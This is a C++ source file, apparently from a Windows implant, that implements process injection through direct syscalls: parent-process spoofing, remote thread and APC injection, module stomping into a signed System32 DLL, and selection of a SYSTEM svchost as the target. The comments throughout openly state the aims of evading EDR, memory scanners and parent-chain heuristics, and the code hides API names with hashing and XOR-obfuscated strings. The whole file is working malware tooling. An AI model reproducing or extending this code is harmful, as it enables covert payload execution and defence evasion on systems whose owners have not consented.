// injection.cpp — Real process injection via direct syscalls (no Win32 API wrappers).
// SpawnWithPPID: PPID spoofing via extended startup info attribute.
// InjectRemoteProcess: full NtOpenProcess → NtAllocateVirtualMemory →
//   NtWriteVirtualMemory → NtProtectVirtualMemory → NtCreateThreadEx chain.
// InjectModuleStomp: load a signed System32 DLL into the target and run the
//   payload out of its .text, so the code is image-backed rather than private RX.
#include "injection.hpp"
#include "syscalls.hpp"
#include "obfuscate.hpp"
#include <windows.h>
#include <tlhelp32.h>
#include <cstdint>
#include <string>
#include <vector>


// ============================================================
// PPID Spoofing — spawn a process under a legitimate parent.
// Makes the new process appear as a child of targetPath's parent
// rather than of the implant, fooling parent-chain heuristics.
// ============================================================
BOOL SpawnWithPPID(const wchar_t* targetPath, DWORD parentPid,
                   HANDLE* hProcessOut, HANDLE* hThreadOut) {
    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hKernel32) return FALSE;
    
    auto _OpenProcess = HASHPROC(hKernel32, OpenProcess);
    auto _InitializeProcThreadAttributeList = HASHPROC(hKernel32, InitializeProcThreadAttributeList);
    auto _UpdateProcThreadAttribute = HASHPROC(hKernel32, UpdateProcThreadAttribute);
    auto _DeleteProcThreadAttributeList = HASHPROC(hKernel32, DeleteProcThreadAttributeList);
    auto _CreateProcessW = (BOOL(WINAPI*)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION))HashProc(hKernel32, FNV("CreateProcessW"));

    if (!_OpenProcess || !_InitializeProcThreadAttributeList || !_UpdateProcThreadAttribute || !_DeleteProcThreadAttributeList || !_CreateProcessW)
        return FALSE;

    HANDLE hParent = _OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
    if (!hParent) return FALSE;

    // Calculate required attribute list size
    SIZE_T attrListSize = 0;
    _InitializeProcThreadAttributeList(nullptr, 1, 0, &attrListSize);

    std::vector<BYTE> attrBuf(attrListSize);
    auto* attrList = reinterpret_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(attrBuf.data());

    if (!_InitializeProcThreadAttributeList(attrList, 1, 0, &attrListSize)) {
        CloseHandle(hParent);
        return FALSE;
    }

    if (!_UpdateProcThreadAttribute(
            attrList, 0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParent, sizeof(hParent),
            nullptr, nullptr)) {
        _DeleteProcThreadAttributeList(attrList);
        CloseHandle(hParent);
        return FALSE;
    }

    STARTUPINFOEXW si = {};
    si.StartupInfo.cb      = sizeof(si);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;
    si.lpAttributeList     = attrList;

    PROCESS_INFORMATION pi = {};
    std::wstring cmdLine   = L"\"" + std::wstring(targetPath) + L"\"";

    BOOL ok = _CreateProcessW(
        nullptr, &cmdLine[0],
        nullptr, nullptr,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW | CREATE_SUSPENDED,
        nullptr, nullptr,
        &si.StartupInfo, &pi);

    // Use the hash-resolved pointer, not the static import: every other
    // kernel32 call in this function goes through HASHPROC and _Delete...
    // was already fetched and null-checked above, so the plain import here was
    // both an inconsistency and an unnecessary load-time dependency.
    _DeleteProcThreadAttributeList(attrList);
    CloseHandle(hParent);

    if (!ok) return FALSE;

    // Hand off or close handles
    if (hProcessOut) *hProcessOut = pi.hProcess;
    else             CloseHandle(pi.hProcess);

    if (hThreadOut) *hThreadOut = pi.hThread;
    else { ResumeThread(pi.hThread); CloseHandle(pi.hThread); }

    return TRUE;
}

// ============================================================
// Inline helpers — syscall with Win32 fallback for optional entries.
// ============================================================
static HANDLE OpenTarget(DWORD pid, DWORD access) {
    if (g_Syscalls.NtOpenProcess) {
        CLIENT_ID cid = {};
        cid.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(pid));
        OBJECT_ATTRIBUTES oa = {};
        InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
        HANDLE h = nullptr;
        if (g_Syscalls.NtOpenProcess(&h, access, &oa, &cid) == 0) return h;
        return nullptr;
    }
    return OpenProcess(access, FALSE, pid);
}

static void CloseTarget(HANDLE h) {
    if (!h) return;
    if (g_Syscalls.NtClose) g_Syscalls.NtClose(h);
    else CloseHandle(h);
}

// Release a remote allocation we no longer intend to use.
// SyscallTable has no NtFreeVirtualMemory, and adding an SSN entry is out of
// scope for a leak fix, so this goes through kernel32 - the same fallback style
// already used for VirtualAllocEx / WriteProcessMemory / VirtualProtectEx
// throughout this file. Without it, every failed attempt permanently stains
// committed memory in the target: repeat a failing inject against svchost a
// few hundred times and the experiment changes the host it is measuring.
static void FreeTarget(HANDLE hProc, PVOID base) {
    if (!hProc || !base) return;
    VirtualFreeEx(hProc, base, 0, MEM_RELEASE);
}

static HANDLE CreateRemoteThreadFallback(HANDLE hProc, PVOID startAddr) {
    if (g_Syscalls.NtCreateThreadEx) {
        HANDLE hThread = nullptr;
        g_Syscalls.NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr,
                                    hProc, startAddr, nullptr, 0, 0, 0, 0, nullptr);
        return hThread;
    }
    return CreateRemoteThread(hProc, nullptr, 0,
                              reinterpret_cast<LPTHREAD_START_ROUTINE>(startAddr),
                              nullptr, 0, nullptr);
}

// ============================================================
// Remote process injection via direct syscall chain.
// Optional syscalls fall back to Win32 equivalents if NULL.
// ============================================================
BOOL InjectRemoteProcess(DWORD pid, const BYTE* payload,
                         SIZE_T payloadSize, HANDLE* hThreadOut) {
    if (!payload || payloadSize == 0) return FALSE;

    HANDLE hProc = OpenTarget(pid,
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD);
    if (!hProc) return FALSE;

    // 2. Allocate RW region
    PVOID  base   = nullptr;
    SIZE_T region = payloadSize;
    if (g_Syscalls.NtAllocateVirtualMemory) {
        NTSTATUS st = g_Syscalls.NtAllocateVirtualMemory(
            hProc, &base, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (st != 0) { CloseTarget(hProc); return FALSE; }
    } else {
        base = VirtualAllocEx(hProc, nullptr, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!base) { CloseTarget(hProc); return FALSE; }
    }

    // 3. Write payload
    SIZE_T written = 0;
    if (g_Syscalls.NtWriteVirtualMemory) {
        NTSTATUS st = g_Syscalls.NtWriteVirtualMemory(hProc, base, (PVOID)payload, payloadSize, &written);
        if (st != 0 || written != payloadSize) { FreeTarget(hProc, base); CloseTarget(hProc); return FALSE; }
    } else {
        if (!WriteProcessMemory(hProc, base, payload, payloadSize, &written) || written != payloadSize) {
            FreeTarget(hProc, base); CloseTarget(hProc); return FALSE;
        }
    }

    // 4. Flip to RX
    if (g_Syscalls.NtProtectVirtualMemory) {
        ULONG oldProt = 0;
        NTSTATUS st = g_Syscalls.NtProtectVirtualMemory(hProc, &base, &region, PAGE_EXECUTE_READ, &oldProt);
        if (st != 0) { FreeTarget(hProc, base); CloseTarget(hProc); return FALSE; }
    } else {
        DWORD oldProt = 0;
        if (!VirtualProtectEx(hProc, base, payloadSize, PAGE_EXECUTE_READ, &oldProt)) {
            FreeTarget(hProc, base); CloseTarget(hProc); return FALSE;
        }
    }

    // 5. Create remote thread
    HANDLE hThread = CreateRemoteThreadFallback(hProc, base);
    if (!hThread) { FreeTarget(hProc, base); CloseTarget(hProc); return FALSE; }

    if (hThreadOut) *hThreadOut = hThread;
    else            CloseTarget(hThread);

    CloseTarget(hProc);
    return TRUE;
}

// ============================================================
// InjectViaApc — queue APC to an alertable thread
// ============================================================
BOOL InjectViaApc(DWORD pid, const BYTE* payload, SIZE_T payloadSize) {
    if (!payload || payloadSize == 0) return FALSE;
    // APC injection requires NtSuspendThread/NtResumeThread/NtQueueApcThread;
    // fall back to a no-op if any are unavailable.
    if (!g_Syscalls.NtSuspendThread || !g_Syscalls.NtResumeThread || !g_Syscalls.NtQueueApcThread)
        return FALSE;

    HANDLE hProc = OpenTarget(pid,
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD);
    if (!hProc) return FALSE;

    PVOID base = nullptr;
    SIZE_T region = payloadSize;
    if (g_Syscalls.NtAllocateVirtualMemory) {
        if (g_Syscalls.NtAllocateVirtualMemory(hProc, &base, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
            CloseTarget(hProc); return FALSE;
        }
    } else {
        base = VirtualAllocEx(hProc, nullptr, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!base) { CloseTarget(hProc); return FALSE; }
    }

    SIZE_T written = 0;
    if (g_Syscalls.NtWriteVirtualMemory) {
        if (g_Syscalls.NtWriteVirtualMemory(hProc, base, (PVOID)payload, payloadSize, &written) != 0 || written != payloadSize) {
            FreeTarget(hProc, base); CloseTarget(hProc); return FALSE;
        }
    } else if (!WriteProcessMemory(hProc, base, payload, payloadSize, &written) || written != payloadSize) {
        FreeTarget(hProc, base); CloseTarget(hProc); return FALSE;
    }

    if (g_Syscalls.NtProtectVirtualMemory) {
        ULONG oldProt = 0;
        if (g_Syscalls.NtProtectVirtualMemory(hProc, &base, &region, PAGE_EXECUTE_READ, &oldProt) != 0) {
            FreeTarget(hProc, base); CloseTarget(hProc); return FALSE;
        }
    } else {
        DWORD oldProt = 0;
        if (!VirtualProtectEx(hProc, base, payloadSize, PAGE_EXECUTE_READ, &oldProt)) {
            FreeTarget(hProc, base); CloseTarget(hProc); return FALSE;
        }
    }

    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hKernel32) { FreeTarget(hProc, base); CloseTarget(hProc); return FALSE; }

    auto _CreateToolhelp32Snapshot = HASHPROC(hKernel32, CreateToolhelp32Snapshot);
    auto _Thread32First = HASHPROC(hKernel32, Thread32First);
    auto _Thread32Next = HASHPROC(hKernel32, Thread32Next);
    auto _OpenThread = HASHPROC(hKernel32, OpenThread);
    auto _CloseHandle = HASHPROC(hKernel32, CloseHandle);

    if (!_CreateToolhelp32Snapshot || !_Thread32First || !_Thread32Next || !_OpenThread || !_CloseHandle) {
        FreeTarget(hProc, base); CloseTarget(hProc); return FALSE;
    }

    HANDLE snap = _CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) { FreeTarget(hProc, base); CloseTarget(hProc); return FALSE; }

    THREADENTRY32 te = {};
    te.dwSize = sizeof(te);
    BOOL queued = FALSE;
    NTSTATUS st = 0;

    if (_Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = _OpenThread(
                    THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION,
                    FALSE, te.th32ThreadID);
                if (hThread) {
                    ULONG suspendCount = 0;
                    g_Syscalls.NtSuspendThread(hThread, &suspendCount);
                    st = g_Syscalls.NtQueueApcThread(
                        hThread, reinterpret_cast<PVOID>(base),
                        nullptr, nullptr, nullptr);
                    if (st == 0) {
                        queued = TRUE;
                        g_Syscalls.NtResumeThread(hThread, &suspendCount);
                        _CloseHandle(hThread);
                        break;
                    }
                    g_Syscalls.NtResumeThread(hThread, &suspendCount);
                    _CloseHandle(hThread);
                }
            }
        } while (_Thread32Next(snap, &te));
    }

    _CloseHandle(snap);
    // No thread accepted the APC, so the region is dead on arrival in the
    // target. Releasing it here is what keeps a failed experiment from leaving
    // RX memory mapped into the host process.
    if (!queued) FreeTarget(hProc, base);
    CloseTarget(hProc);
    return queued;
}

// ============================================================
// Module stomping
// ============================================================
// Load a legitimate signed DLL into the target, overwrite its .text with the
// payload, and start a thread at the module base. The payload then lives in an
// image-backed section of a Microsoft binary instead of a private RX
// allocation - the artifact most memory scanners key on. The write dirties
// copy-on-write pages in the target only: the file on disk and every other
// process mapping it stay untouched. The host module is not restored, so the
// operator must pick a DLL the target does not need afterwards.
namespace {

struct TextSection {
    DWORD rva  = 0;
    DWORD size = 0;
};

bool ReadFileBytes(const wchar_t* path, std::vector<BYTE>& out) {
    HANDLE h = CreateFileW(path, GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER sz = {};
    bool ok = GetFileSizeEx(h, &sz) && sz.QuadPart > 0x1000 &&
              sz.QuadPart < 64 * 1024 * 1024;
    if (ok) {
        out.resize(static_cast<size_t>(sz.QuadPart));
        DWORD read = 0;
        ok = ReadFile(h, out.data(), static_cast<DWORD>(out.size()), &read, nullptr) &&
             read == out.size();
    }
    CloseHandle(h);
    return ok;
}

// .text geometry from the on-disk image — the same ground truth an EDR
// compares the in-memory section against.
bool FindTextSection(const std::vector<BYTE>& image, TextSection& out) {
    if (image.size() < sizeof(IMAGE_DOS_HEADER)) return false;
    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(image.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    if (static_cast<size_t>(dos->e_lfanew) + sizeof(IMAGE_NT_HEADERS64) > image.size())
        return false;

    auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(image.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return false;

    auto* secs = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(secs[i].Name, ".text", 5) == 0) {
            out.rva  = secs[i].VirtualAddress;
            out.size = secs[i].Misc.VirtualSize > secs[i].SizeOfRawData
                           ? secs[i].Misc.VirtualSize
                           : secs[i].SizeOfRawData;
            return out.size > 0;
        }
    }
    return false;
}

// Base address of a named module inside the target process.
PVOID RemoteModuleBase(DWORD pid, const wchar_t* moduleName) {
    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hKernel32 || !moduleName) return nullptr;

    auto _Snap        = HASHPROC(hKernel32, CreateToolhelp32Snapshot);
    auto _ModFirst    = HASHPROC(hKernel32, Module32FirstW);
    auto _ModNext     = HASHPROC(hKernel32, Module32NextW);
    auto _CloseHandle = HASHPROC(hKernel32, CloseHandle);
    if (!_Snap || !_ModFirst || !_ModNext || !_CloseHandle) return nullptr;

    HANDLE snap = _Snap(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (snap == INVALID_HANDLE_VALUE) return nullptr;

    MODULEENTRY32W me = {};
    me.dwSize = sizeof(me);
    PVOID base = nullptr;
    if (_ModFirst(snap, &me)) {
        do {
            if (_wcsicmp(me.szModule, moduleName) == 0) { base = me.modBaseAddr; break; }
        } while (_ModNext(snap, &me));
    }
    _CloseHandle(snap);
    return base;
}

bool AllocRemote(HANDLE hProc, SIZE_T size, PVOID& base) {
    base = nullptr;
    SIZE_T region = size;
    if (g_Syscalls.NtAllocateVirtualMemory) {
        return g_Syscalls.NtAllocateVirtualMemory(hProc, &base, 0, &region,
                                                  MEM_COMMIT | MEM_RESERVE,
                                                  PAGE_READWRITE) == 0;
    }
    base = VirtualAllocEx(hProc, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    return base != nullptr;
}

bool WriteRemote(HANDLE hProc, PVOID dst, const void* src, SIZE_T size) {
    SIZE_T written = 0;
    if (g_Syscalls.NtWriteVirtualMemory) {
        return g_Syscalls.NtWriteVirtualMemory(hProc, dst, const_cast<void*>(src), size,
                                               &written) == 0 && written == size;
    }
    return WriteProcessMemory(hProc, dst, src, size, &written) && written == size;
}

bool ProtectRemote(HANDLE hProc, PVOID addr, SIZE_T size, DWORD prot) {
    if (g_Syscalls.NtProtectVirtualMemory) {
        PVOID base = addr;
        SIZE_T region = size;
        ULONG oldProt = 0;
        return g_Syscalls.NtProtectVirtualMemory(hProc, &base, &region, prot,
                                                 &oldProt) == 0;
    }
    DWORD oldProt = 0;
    return VirtualProtectEx(hProc, addr, size, prot, &oldProt) != 0;
}

// CreateRemoteThreadFallback passes no argument; LoadLibraryW needs the remote
// path string, so this variant takes one.
HANDLE CreateRemoteThreadParam(HANDLE hProc, PVOID startAddr, PVOID param) {
    if (g_Syscalls.NtCreateThreadEx) {
        HANDLE hThread = nullptr;
        g_Syscalls.NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr, hProc,
                                    startAddr, param, 0, 0, 0, 0, nullptr);
        return hThread;
    }
    return CreateRemoteThread(hProc, nullptr, 0,
                              reinterpret_cast<LPTHREAD_START_ROUTINE>(startAddr),
                              param, 0, nullptr);
}

} // namespace

BOOL InjectModuleStomp(DWORD pid, const BYTE* payload, SIZE_T payloadSize,
                       const wchar_t* hostDll, HANDLE* hThreadOut) {
    if (!payload || payloadSize == 0 || !hostDll) return FALSE;

    std::vector<BYTE> hostImage;
    TextSection text;
    if (!ReadFileBytes(hostDll, hostImage) || !FindTextSection(hostImage, text))
        return FALSE;
    if (payloadSize > text.size) return FALSE;

    // Accept either separator: operators type '\', scripts and tests often pass
    // '/', and every Win32 file API takes both.
    wchar_t dllName[MAX_PATH] = {};
    {
        const wchar_t* slash  = wcsrchr(hostDll, L'\\');
        const wchar_t* fslash = wcsrchr(hostDll, L'/');
        const wchar_t* cut = (!slash || (fslash && fslash > slash)) ? fslash : slash;
        wcsncpy_s(dllName, cut ? cut + 1 : hostDll, _TRUNCATE);
    }

    HANDLE hProc = OpenTarget(pid,
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD);
    if (!hProc) return FALSE;

    // 1. Stage the DLL path inside the target and have the target load it.
    SIZE_T pathBytes = (wcslen(hostDll) + 1) * sizeof(wchar_t);
    PVOID remotePath = nullptr;
    if (!AllocRemote(hProc, pathBytes, remotePath) ||
        !WriteRemote(hProc, remotePath, hostDll, pathBytes)) {
        if (remotePath) FreeTarget(hProc, remotePath);
        CloseTarget(hProc);
        return FALSE;
    }

    // LoadLibraryW's offset inside its own module is identical in every process
    // running the same kernel32, so resolve the RVA locally and apply it to the
    // target's kernel32 base.
    HMODULE hLocalK32 = GetModuleHandleA(XS("kernel32.dll"));
    FARPROC pLoadLibraryW = hLocalK32 ? HashProc(hLocalK32, FNV("LoadLibraryW")) : nullptr;
    auto k32Name = XSW(L"kernel32.dll");
    PVOID k32TargetBase = RemoteModuleBase(pid, k32Name.str());
    if (!hLocalK32 || !pLoadLibraryW || !k32TargetBase) {
        FreeTarget(hProc, remotePath);
        CloseTarget(hProc);
        return FALSE;
    }
    PVOID remoteLoadLibraryW = reinterpret_cast<BYTE*>(k32TargetBase) +
        (reinterpret_cast<BYTE*>(pLoadLibraryW) - reinterpret_cast<BYTE*>(hLocalK32));

    HANDLE hLoad = CreateRemoteThreadParam(hProc, remoteLoadLibraryW, remotePath);
    if (!hLoad) {
        FreeTarget(hProc, remotePath);
        CloseTarget(hProc);
        return FALSE;
    }
    WaitForSingleObject(hLoad, 10000);
    CloseTarget(hLoad);
    FreeTarget(hProc, remotePath);   // LoadLibrary consumed the string

    // 2. Re-enumerate for the base instead of trusting the thread's exit code:
    //    when the DLL was already loaded, LoadLibrary only bumps a refcount.
    PVOID moduleBase = RemoteModuleBase(pid, dllName);
    if (!moduleBase) { CloseTarget(hProc); return FALSE; }

    // 3. Stomp .text: RW -> write -> RX. Copy-on-write confines the change to
    //    the target process; disk and other processes are untouched.
    PVOID textAddr = reinterpret_cast<BYTE*>(moduleBase) + text.rva;
    if (!ProtectRemote(hProc, textAddr, payloadSize, PAGE_EXECUTE_READWRITE) ||
        !WriteRemote(hProc, textAddr, payload, payloadSize) ||
        !ProtectRemote(hProc, textAddr, payloadSize, PAGE_EXECUTE_READ)) {
        CloseTarget(hProc);
        return FALSE;
    }

    // 4. Execute from inside the module: image-backed, inside a signed
    //    module's address range.
    HANDLE hThread = CreateRemoteThreadParam(hProc, textAddr, nullptr);
    if (!hThread) { CloseTarget(hProc); return FALSE; }

    if (hThreadOut) *hThreadOut = hThread;
    else            CloseTarget(hThread);

    CloseTarget(hProc);
    return TRUE;
}

// ============================================================
DWORD FindBestSvchost() {
    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    auto hAdvapi32 = GetModuleHandleA(XS("advapi32.dll"));
    if (!hAdvapi32) hAdvapi32 = LoadLibraryA(XS("advapi32.dll"));
    if (!hKernel32 || !hAdvapi32) return 0;

    auto _CreateToolhelp32Snapshot = HASHPROC(hKernel32, CreateToolhelp32Snapshot);
    auto _Process32FirstW = HASHPROC(hKernel32, Process32FirstW);
    auto _Process32NextW = HASHPROC(hKernel32, Process32NextW);
    auto _OpenProcess = HASHPROC(hKernel32, OpenProcess);
    auto _CloseHandle = HASHPROC(hKernel32, CloseHandle);
    
    auto _OpenProcessToken = HASHPROC(hAdvapi32, OpenProcessToken);
    auto _GetTokenInformation = HASHPROC(hAdvapi32, GetTokenInformation);
    auto _IsWellKnownSid = HASHPROC(hAdvapi32, IsWellKnownSid);

    if (!_CreateToolhelp32Snapshot || !_Process32FirstW || !_Process32NextW || 
        !_OpenProcess || !_CloseHandle || !_OpenProcessToken || 
        !_GetTokenInformation || !_IsWellKnownSid) return 0;

    HANDLE snap = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);

    DWORD bestPid   = 0;
    DWORD lowestPid = DWORD(-1);

    // Decode once before the loop — XorStr::str() XORs buf in-place, so
    // calling it on every iteration re-encrypts and produces garbage.
    wchar_t svcName[16] = {};
    { auto tmp = XSW(L"svchost.exe"); wcsncpy_s(svcName, tmp.str(), _TRUNCATE); }

    if (_Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, svcName) != 0) continue;

            // Check if it runs as SYSTEM via token
            HANDLE hProc = _OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                       FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            HANDLE hTok = nullptr;
            if (_OpenProcessToken(hProc, TOKEN_QUERY, &hTok)) {
                BYTE buf[256] = {};
                DWORD len = 0;
                if (_GetTokenInformation(hTok, TokenUser, buf, sizeof(buf), &len)) {
                    auto* tu = reinterpret_cast<TOKEN_USER*>(buf);
                    // SYSTEM SID: S-1-5-18
                    if (_IsWellKnownSid(tu->User.Sid, WinLocalSystemSid)) {
                        if (pe.th32ProcessID < lowestPid) {
                            lowestPid = pe.th32ProcessID;
                            bestPid   = pe.th32ProcessID;
                        }
                    }
                }
                _CloseHandle(hTok);
            }
            _CloseHandle(hProc);

        } while (_Process32NextW(snap, &pe));
    }

    _CloseHandle(snap);
    return bestPid;
}